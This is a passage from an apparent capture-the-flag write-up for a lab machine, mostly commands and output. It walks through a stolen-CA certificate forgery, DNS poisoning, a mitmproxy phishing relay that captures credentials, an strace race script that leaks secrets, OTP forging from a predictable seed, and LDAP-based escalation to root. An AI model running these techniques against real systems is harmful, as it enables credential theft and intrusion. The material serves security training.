openssl x509 -req -in evil.csr -CA RootCA.crt -CAkey RootCA.key -CAcreateserial \
  -passin pass:password -out evil.crt -days 365 -sha256 \
  -extfile <(printf 'subjectAltName=DNS:evil.sorcery.htb,DNS:git.sorcery.htb\nextendedKeyUsage=serverAuth\n')

openssl verify -CAfile RootCA.crt evil.crt
# evil.crt: OK

cat evil.key evil.crt > evil-combined.pem
chmod 600 evil-combined.pem
```

---

## 9. MITM Gitea as evil.sorcery.htb - Phishing mail_bot

The `mail_bot` container (`docker-compose.yml:115-128`) validates outbound TLS against `RootCA.crt` (`CA_FILE` env), so a cert signed with `RootCA.key` is trusted from inside the container.

### 9.1 Poison the internal DNS

Inside the dns-container shell (uid=1001 `user` from §6.5), append to the user-writable hosts file:

```bash
echo "10.10.15.242 evil.sorcery.htb" >> /dns/hosts-user
cat /dns/hosts-user
# 10.10.15.242 evil.sorcery.htb
```

Force-reload the resolver:

```bash
pkill -9 dnsmasq
dnsmasq --no-daemon --addn-hosts /dns/hosts-user
# dnsmasq: started, version 2.89 cachesize 150
# dnsmasq: read /dns/hosts-user - 1 names
```

Equivalent via the web flow: click **Force Records Re-fetch** on the admin DNS dashboard (that button POSTs `/api/dns/` which Kafka-publishes `/dns/convert.sh` per `backend/src/api/dns/update.rs:20-24`).

![DNS admin dashboard after the hosts-user merge](file-20260424161201253.png)

Every container on the docker network now resolves `evil.sorcery.htb` → `10.10.15.242`.

### 9.2 mitmproxy in reverse mode

On the attacker host, bind on :443 with our RootCA-signed cert, proxy through to the real Gitea:

```bash
uvx mitmproxy \
      --mode reverse:https://git.sorcery.htb/ \
      --certs evil-combined.pem \
      --save-stream-file trafficraw.k \
      -p 443 --ssl-insecure
```

- `--mode reverse:...` - proxy every request to the real Gitea so the bot sees authentic HTML and CSRF tokens.
- `--certs evil-combined.pem` - our RootCA-signed cert on all SNIs.
- `--ssl-insecure` - skip upstream TLS verification (Gitea uses its own cert inside the cluster).

### 9.3 Drop the lure via MailHog SMTP

```bash
swaks --to "tom_summers@sorcery.htb" --from "security@sorcery.htb" \
      --server 172.19.0.6:1025 \
      --h-Subject "Password expired - reauthenticate" \
      --body "Please sign in to reset your credentials: https://evil.sorcery.htb/user/login"
```

```
=== Connected to 172.19.0.6.
<-  220 mailhog.example ESMTP MailHog
 -> MAIL FROM:<security@sorcery.htb>
<-  250 Sender security@sorcery.htb ok
 -> RCPT TO:<tom_summers@sorcery.htb>
<-  250 Recipient tom_summers@sorcery.htb ok
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
<-  250 Ok: queued as zPRRNfzX44LViPwnBv9PBMacDHJgzIPbqetT2Fa0bzw=@mailhog.example
```

![Phishing email as seen in the MailHog UI](file-20260424162907334.png)

Sanity-check: retrying with a cert **not** signed by the RootCA gets the bot to reject the link and email back:

![Bot rejection response when cert chain is invalid](file-20260424162934735.png)

This confirms that `CA_FILE` trust gates the phishing flow.

### 9.4 Credentials captured by mitmproxy

After `MAIL_BOT_INTERVAL` seconds the bot follows the link, our cert validates, it loads the real Gitea login page, and POSTs credentials.

![mitmproxy flow list showing the bot's POST request](file-20260424163531171.png)

![mitmproxy flow detail with the POST body containing credentials](file-20260424163556722.png)

```
_csrf:     7Ks4ApwDIQ21MwEDoDinDRuyYuo6MTc3NzA1OTI3MzM5OTA0MDE2MA
user_name: tom_summers
password:  jNsMKQ6k2.XDMPu.
```

**`tom_summers : jNsMKQ6k2.XDMPu.`**

---

## 10. SSH tom_summers - Xvfb Framebuffer Leak

```bash
ssh tom_summers@sorcery.htb
# Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-60-generic x86_64)

tom_summers@main:~$ id
uid=2001(tom_summers) gid=2001(tom_summers) groups=2001(tom_summers)

tom_summers@main:~$ cat ~/user.txt
<REDACTED>
```

Enumerating further, a **world-readable XWD framebuffer dump** from `tom_summers_admin`'s idle Xvfb session:

```bash
ls -la /xorg/xvfb/Xvfb_screen0
# -rwxr--r-- 1 tom_summers_admin tom_summers_admin 527520 Apr 24 17:40 /xorg/xvfb/Xvfb_screen0

file /xorg/xvfb/Xvfb_screen0
# X-Window screen dump image data, version X11, "Xvfb main.sorcery.htb:1.0", 512x256x24, 256 colors 256 entries
```

XWD is a native ImageMagick input format. Exfiltrate via base64 over SSH, then convert:

```bash
# On the target
base64 -w0 /xorg/xvfb/Xvfb_screen0 > /tmp/fb.b64

# On the attacker
sshpass -p 'jNsMKQ6k2.XDMPu.' ssh tom_summers@sorcery.htb \
      'cat /tmp/fb.b64' | base64 -d > Xvfb_screen0
convert xwd:Xvfb_screen0 screen.png
```

The decoded image - a sticky-note-style editor window left open on the virtual display:

![Xvfb framebuffer dump showing a sticky-note editor with credentials](file-20260424170208510.png)

```
username: tom_summers_admin
password: dWpuk7cesBjT-
```

**`tom_summers_admin : dWpuk7cesBjT-`**

---

## 11. sudo + strace Race to rebecca_smith

```bash
tom_summers_admin@main:~$ sudo -l
User tom_summers_admin may run the following commands on localhost:
    (rebecca_smith) NOPASSWD: /usr/bin/docker login
    (rebecca_smith) NOPASSWD: /usr/bin/strace -s 128 -p [0-9]*
```

Two sudo rules that chain:

1. `sudo -u rebecca_smith docker login` spawns a transient `docker-credential-docker-auth` helper owned by rebecca.
2. `sudo -u rebecca_smith strace -s 128 -p [0-9]*` attaches to any rebecca-owned PID (`ptrace_scope=0` + same-UID rule).

The cred helper reads `/home/rebecca_smith/.docker/creds`, decrypts with AES, and `write()`s plaintext JSON to a pipe for `docker` CLI. Attach strace during that pipe write and the credentials leak.

### 11.1 Lifecycle observation

```bash
while true; do ps -u rebecca_smith --no-headers; sleep 1; done
# 249649 pts/2  00:00:00 docker
# 249676 pts/2  00:00:00 docker-credenti     <- attach target
# 249649 pts/2  00:00:00 docker
```

`docker-credenti` is truncated `docker-credential-docker-auth` (15-char comm limit).

### 11.2 Watcher + trigger race

```bash
cat <<'SH' > /tmp/race.sh
#!/bin/bash
rm -f /tmp/trace.log /tmp/dlogin_in
mkfifo /tmp/dlogin_in

# Tight watcher - polls every 1ms for the cred helper and attaches strace
(
  for i in $(seq 1 2000); do
    pid=$(pgrep -u rebecca_smith -f 'docker-credential' | head -1)
    if [ -n "$pid" ]; then
      exec sudo -n -u rebecca_smith /usr/bin/strace -s 128 -p "$pid" > /tmp/trace.log 2>&1
    fi
    perl -e 'select undef,undef,undef,0.001'
  done
) &
perl -e 'select undef,undef,undef,0.03'

# Trigger docker login; stdin on a FIFO so the helper is alive long enough to attach
sudo -n -u rebecca_smith /usr/bin/docker login < /tmp/dlogin_in &
DL=$!
sleep 2
exec 3>/tmp/dlogin_in; exec 3>&-
wait $DL 2>/dev/null
SH
chmod +x /tmp/race.sh && /tmp/race.sh
```

Filter the trace:

```bash
grep -aE '"(Username|Secret)"' /tmp/trace.log
# write(33, "{\"Username\":\"rebecca_smith\",\"Secret\":\"-7eAZDp9-f9mg\"}\n", 54) = 54
```

**`rebecca_smith : -7eAZDp9-f9mg`**

---

## 12. Reversing the Cred Helper - OTP - Docker Registry - donna_adams

`/usr/bin/docker-credential-docker-auth` is a .NET single-file binary. Pull it off the box and open in dnSpy or JetBrains dotPeek:

![dnSpy decompile of docker-credential-docker-auth showing HandleOtp and HandleGet](file-20260424172219799.png)

Critical excerpts:

```csharp
static UnixUserInfo GetCurrentExecutableOwner() => new UnixFileInfo("/proc/self/exe").OwnerUser;
static string GetCredsPath(string username) => $"/home/{username}/.docker/creds";

static void HandleOtp(object dynamicArgs)
{
    new Random(DateTime.Now.Minute / 10 + (int) GetCurrentExecutableOwner().UserId).Next(100000, 999999);
    Console.WriteLine("OTP is currently experimental. Please ask our admins for one");
}

static void HandleGet(object dynamicArgs)
{
    byte[] numArray1 = Convert.FromBase64String(File.ReadAllText(GetCredsPath(GetCurrentExecutableOwner().UserName)));
    using (Aes aes = Aes.Create()) {
        aes.Key = new byte[16];   aes.IV = new byte[16];   // static all-zero key/IV
        ...
        Console.Error.WriteLine("This account might be protected by two-factor authentication");
        Console.Error.WriteLine("In case login fails, try logging in with <password><otp>");
        Console.WriteLine(end);
    }
}
```

Two useful observations:

1. **`HandleOtp` is dead code**: the `.Next(100000,999999)` result is **discarded**. But the seed `Minute/10 + uid` is fully predictable, and the stderr note says the registry accepts `password<otp>` concat. We can **reproduce the OTP client-side**.
2. **`HandleGet`'s AES key+IV are 16 zero bytes**: decryption is effectively a no-op. We already have the plaintext from strace; this just confirms the creds file is not protecting anything.

### 12.1 Port C# `System.Random` to Python

```python
class CSharpRandom:
    MBIG = 0x7FFFFFFF
    def __init__(self, seed):
        sa=[0]*56; mj=161803398-abs(seed); sa[55]=mj; mk=1
        for i in range(1,55):
            ii=(21*i)%55; sa[ii]=mk; mk=mj-mk
            if mk<0: mk+=self.MBIG
            mj=sa[ii]
        for _ in range(4):
            for i in range(1,56):
                n=i+30
                if n>=55: n-=55
                sa[i]-=sa[1+n]
                if sa[i]<0: sa[i]+=self.MBIG
        self.sa=sa; self.i=0; self.p=21
    def _s(self):
        li=self.i+1
        if li>=56: li=1
        lp=self.p+1
        if lp>=56: lp=1
        v=self.sa[li]-self.sa[lp]
        if v==self.MBIG: v-=1
        if v<0: v+=self.MBIG
        self.sa[li]=v; self.i=li; self.p=lp
        return v
    def Next(self, a, b):
        return int(self._s()*(1.0/self.MBIG)*(b-a)) + a
```

### 12.2 Compute the OTP and auth to the registry

```bash
# Without OTP: UNAUTHORIZED
curl -s -u "rebecca_smith:-7eAZDp9-f9mg" http://localhost:5000/v2/_catalog
# {"errors":[{"code":"UNAUTHORIZED","message":"authentication required", ...}]}

# With password+OTP concat - OTP derived from server minute
MIN=$(date +%-M); BUCKET=$((MIN/10))
OTP=$(python3 -c "
class CSharpRandom:
    [... class body as above ...]
print(CSharpRandom($BUCKET+2003).Next(100000,999999))")

curl -s -u "rebecca_smith:-7eAZDp9-f9mg${OTP}" http://localhost:5000/v2/_catalog
# {"repositories":["test-domain-workstation"]}
```

`2003` is `rebecca_smith`'s UID (the binary calls `GetCurrentExecutableOwner().UserId` where the owner is the binary's file owner).

### 12.3 Pull the image and scan layers

```bash
AUTH="rebecca_smith:-7eAZDp9-f9mg${OTP}"
BASE=http://localhost:5000/v2/test-domain-workstation

curl -s -u "$AUTH" $BASE/tags/list
# {"name":"test-domain-workstation","tags":["latest"]}

curl -s -u "$AUTH" -H "Accept: application/vnd.docker.distribution.manifest.v2+json" \
   $BASE/manifests/latest | python3 -m json.tool | head -40
```

Manifest lists 4 layers. The 246-byte one is application-specific data stacked on top of Ubuntu base:

```json
"layers": [
  {"size": 30610919, "digest": "sha256:802008e7f7..."},
  {"size": 29979842, "digest": "sha256:92879ec4..."},
  {"size": 100598014,"digest": "sha256:bff382ed..."},
  {"size":    246,   "digest": "sha256:292e59a8..."}
]
```

Pull and extract:

```bash
curl -s -u "$AUTH" -o small.tgz $BASE/blobs/sha256:292e59a8...
tar xzf small.tgz
cat docker-entrypoint.sh
```

```bash
#!/bin/bash
ipa-client-install --unattended --principal donna_adams --password 3FEVPCT_c3xDH \
    --server dc01.sorcery.htb --domain sorcery.htb --no-ntp --force-join --mkhomedir
```

**`donna_adams : 3FEVPCT_c3xDH`** - the IPA workstation-enrollment principal.

---

## 13. donna_adams to ash_winter via LDAP Password Reset

### 13.1 Discover the permission

```bash
ssh donna_adams@sorcery.htb  # password: 3FEVPCT_c3xDH

echo 3FEVPCT_c3xDH | kinit donna_adams
klist
# Default principal: donna_adams@SORCERY.HTB

ipa user-show donna_adams --all | grep -E 'role|Member'
#   Member of groups: ipausers
#   Member of HBAC rule: allow_sudo, allow_ssh
#   Indirect Member of role: change_userPassword_ash_winter_ldap
```

`change_userPassword_ash_winter_ldap` = direct write on the `userPassword` attribute of `ash_winter`. Scoped to the attribute, not the `passwordModify` extended op - `ldappasswd` fails (goes via the password-policy plugin), but `ldapmodify` with `replace` works.

### 13.2 Direct-attribute LDAP replace

```bash
cat > /tmp/mod.ldif <<EOF
dn: uid=ash_winter,cn=users,cn=accounts,dc=sorcery,dc=htb
changetype: modify
replace: userPassword
userPassword: AshW1nter!
EOF

ldapmodify -H ldaps://dc01.sorcery.htb -x \
  -D "uid=donna_adams,cn=users,cn=accounts,dc=sorcery,dc=htb" \
  -w "3FEVPCT_c3xDH" -f /tmp/mod.ldif
# modifying entry "uid=ash_winter,cn=users,cn=accounts,dc=sorcery,dc=htb"
```

### 13.3 The password is set but expired

Direct-attribute writes set `krbPasswordExpiration = now`, so the first SSH demands an interactive change:

```
ssh ash_winter@sorcery.htb
ash_winter@sorcery.htb's password: AshW1nter!
WARNING: Your password has expired.
You must change your password now and login again!
Current Password: AshW1nter!
New password: Qzx7mKrPvN2Lp@8
Retype new password: Qzx7mKrPvN2Lp@8
passwd: password updated successfully
Connection to sorcery.htb closed.
```

Re-auth with the new password:

```bash
sshpass -p 'Qzx7mKrPvN2Lp@8' ssh ash_winter@sorcery.htb id
# uid=1638400004(ash_winter) gid=1638400004(ash_winter) groups=1638400004(ash_winter)
```

**`ash_winter : Qzx7mKrPvN2Lp@8`**

---

## 14. ash_winter to Root via LDAP Self-Promotion

### 14.1 The two ingredients

```bash
ash_winter@main:~$ sudo -l
User ash_winter may run the following commands on localhost:
    (root) NOPASSWD: /usr/bin/systemctl restart sssd

ash_winter@main:~$ echo Qzx7mKrPvN2Lp@8 | kinit ash_winter
ash_winter@main:~$ ipa user-show ash_winter --all | grep role
#   Indirect Member of role: add_sysadmin
```

- `add_sysadmin` = LDAP write permission on `cn=sysadmins,cn=groups,cn=accounts,dc=sorcery,dc=htb`.
- The `sysadmins` group already holds the role `manage_sudorules_ldap`:
  ```bash
  ldapsearch -H ldaps://dc01.sorcery.htb -x \
      -D "uid=ash_winter,cn=users,cn=accounts,dc=sorcery,dc=htb" -w "Qzx7mKrPvN2Lp@8" \
      -b "cn=sysadmins,cn=groups,cn=accounts,dc=sorcery,dc=htb"
  # memberOf: cn=manage_sudorules_ldap,cn=roles,cn=accounts,dc=sorcery,dc=htb
  ```
- The `allow_sudo` sudo rule is `Host/Cmd/RunAsUser/RunAsGroup category: all` (permissive) but `Users: admin` only.
- `sudo systemctl restart sssd` is the cache flush needed to pick up every LDAP change without waiting.

### 14.2 Add ash to `sysadmins` via LDAP

```bash
cat > /tmp/add.ldif <<EOF
dn: cn=sysadmins,cn=groups,cn=accounts,dc=sorcery,dc=htb
changetype: modify
add: member
member: uid=ash_winter,cn=users,cn=accounts,dc=sorcery,dc=htb
EOF

ldapmodify -H ldaps://dc01.sorcery.htb -x \
    -D "uid=ash_winter,cn=users,cn=accounts,dc=sorcery,dc=htb" \
    -w "Qzx7mKrPvN2Lp@8" -f /tmp/add.ldif
# modifying entry "cn=sysadmins,cn=groups,cn=accounts,dc=sorcery,dc=htb"

sudo -n /usr/bin/systemctl restart sssd
id
# uid=1638400004(ash_winter) gid=1638400004(ash_winter) groups=1638400004(ash_winter),1638400005(sysadmins)
```

### 14.3 Add `sysadmins` to the `allow_sudo` rule

Now that `ash_winter` holds `manage_sudorules_ldap` through the group, `ipa sudorule-add-user` succeeds:

```bash
ipa sudorule-add-user allow_sudo --groups=sysadmins
```

```
Rule name: allow_sudo
Enabled: True
Host category: all
Command category: all
Users: admin
User Groups: sysadmins
-------------------------
Number of members added 1
```

### 14.4 Also add `sysadmins` to the `allow_sudo` HBAC rule

```bash
ipa hbacrule-add-user allow_sudo --groups=sysadmins
sudo -n /usr/bin/systemctl restart sssd
```

### 14.5 Root

```bash
ash_winter@main:~$ sudo -l
User ash_winter may run the following commands on localhost:
    (root) NOPASSWD: /usr/bin/systemctl restart sssd
    (ALL : ALL) ALL

ash_winter@main:~$ echo Qzx7mKrPvN2Lp@8 | sudo -S cat /root/root.txt
<REDACTED>

ash_winter@main:~$ echo Qzx7mKrPvN2Lp@8 | sudo -S bash -c 'id; hostname'
uid=0(root) gid=0(root) groups=0(root)
main.sorcery.htb
```

---

## 15. Vulnerability Catalogue

| # | Vuln | File / location | Severity | Role in the chain |
|---|---|---|---|---|
| 1 | Unescaped Cypher injection in `#[derive(Model)]` | `backend-macros/src/lib.rs:155-158` | Critical | Leaks admin hash, registration_key; SET rewrites admin.password |
| 2 | No validator on `Product::get_by_id` path segment | `backend/src/api/products/get_one.rs:13` | High | Delivery for #1 |
| 3 | Stored XSS via `dangerouslySetInnerHTML` on `product.description` | `frontend/src/app/dashboard/store/[product]/page.tsx:29-34` | Critical | Admin-bot code execution |
| 4 | Seller product-insert spawns admin headless Chrome with scoped JWT covering passkey-register | `backend/src/api/products/insert.rs:38-121` | Critical | Admin-context execution of #3 |
| 5 | `start_registration` trusts client-supplied `username`, stores state under TARGET `user.id` | `backend/src/api/webauthn/passkey/start_registration.rs:37-58` | Critical | Plant a passkey-state slot under admin.id |
| 6 | `finish_registration` retrieves state by CALLER `claims.id`, overwrites passkey HashMap entry | `backend/src/api/webauthn/passkey/finish_registration.rs:26-48` | Critical | Overwrite admin's passkey with ours |
| 7 | Session cookie is `http_only(false) secure(false)` | `backend/src/api/auth/login.rs:69-73` | High | Cookie theft from any XSS |
| 8 | Debug endpoint = raw TCP relay to any host/port | `backend/src/api/debug/debug.rs:27-74` | High (post-auth) | Arbitrary outbound from backend |
| 9 | DNS service runs Kafka message values as `bash -c` | `dns/src/main.rs:60-77` | Critical | Unauthenticated RCE for anyone who can produce to `update` |
| 10 | Headless Chrome launched with `sandbox: false`, random CDP port 8000-9000 on loopback | `backend/src/api/products/insert.rs:86-91` | Medium | Parallel CDP-virtual-authenticator path |
| 11 | JWT secret rotates on each backend boot (`Uuid::new_v4()`) | `backend/src/db/connection.rs:21` | Low | Tokens invalidate on restart |
| 12 | Anonymous FTP mounts `RootCA.crt` + `RootCA.key` | `docker-compose.yml:84-85` | Critical | CA private-key exposure |
| 13 | CA private key protected with trivial password (`"password"`) | `RootCA.key` PEM header | Critical | Cracked in one guess |
| 14 | mail_bot follows any link whose cert is signed by `RootCA.crt`, submits `PHISHING_*` env creds | `docker-compose.yml:115-128` | Critical | Phishes `tom_summers` creds |
| 15 | Xvfb dump world-readable (`/xorg/xvfb/Xvfb_screen0` mode 0744) with credentials on screen | host filesystem | High | `tom_summers_admin` creds |
| 16 | `sudo -u rebecca_smith strace -p [0-9]*` + `ptrace_scope=0` - race-attach cred helper | `/etc/sudoers.d/tom_summers_admin` | High | Leaks rebecca from helper pipe |
| 17 | `docker-credential-docker-auth` uses static all-zero AES key/IV; OTP RNG deterministic and dead-code | decompiled helper | High | Reproducible OTP - registry auth |
| 18 | Docker registry leaks IPA enrollment principal in image layer | `sha256:292e59a8...` | Critical | Discloses `donna_adams` |
| 19 | IPA permission `change_userPassword_ash_winter_ldap` = raw `userPassword` replace | IPA ACI | Critical | Pivot donna → ash |
| 20 | IPA `add_sysadmin` + `manage_sudorules_ldap` + `sudo systemctl restart sssd` | IPA roles + `/etc/sudoers.d/ash_winter` | Critical | Self-promote ash → root |

---

## 16. Condensed Runbook

1. **Recon** - `nmap`, `/etc/hosts`, clone `git.sorcery.htb/nicole_sullivan/infrastructure.git` anonymously.
2. **Register** a Client via `/auth/register` (no key needed).
3. **Cypher-inject** `Product::get_by_id` - leak `Config.registration_key` (and admin hash for info).
4. **Re-register** as Seller with the leaked key.
5. **Choose admin path:**
   - (a) **Cypher `SET admin.password = seller.password`** - direct login, enroll a passkey legitimately, authenticate with passkey - `with_passkey:true`.
   - (b) XSS + passkey-overwrite (sections 2-4) - more moving parts but demonstrates the full chain.
6. **Admin + passkey** - `/api/debug/port` - craft Kafka v0 ProduceRequest - bash reverse shell inside the `dns` container.
7. **Deploy ligolo-ng** agent, autoroute `172.19.0.0/16`.
8. **Anonymous FTP @ 172.19.0.10** - `RootCA.crt` / `RootCA.key`; passphrase = `password`.
9. **Sign `evil.sorcery.htb` cert**, poison `/dns/hosts-user`, `mitmproxy reverse` Gitea, swaks lure - capture `tom_summers` creds.
10. **SSH tom_summers** - user flag - decode `/xorg/xvfb/Xvfb_screen0` - `tom_summers_admin`.
11. **`sudo -u rebecca_smith strace`** race against `docker login` - cred helper pipe write - `rebecca_smith`.
12. **Reverse `docker-credential-docker-auth`** - predictable OTP - Docker registry auth - pull `test-domain-workstation` - `donna_adams`.
13. **donna → `ldapmodify replace: userPassword`** on ash_winter - rotate expired password on SSH.
14. **ash → `ldapmodify add: member`** on `sysadmins` - `ipa sudorule-add-user allow_sudo --groups=sysadmins` - `sudo systemctl restart sssd` - `(ALL:ALL) ALL` - **root**.
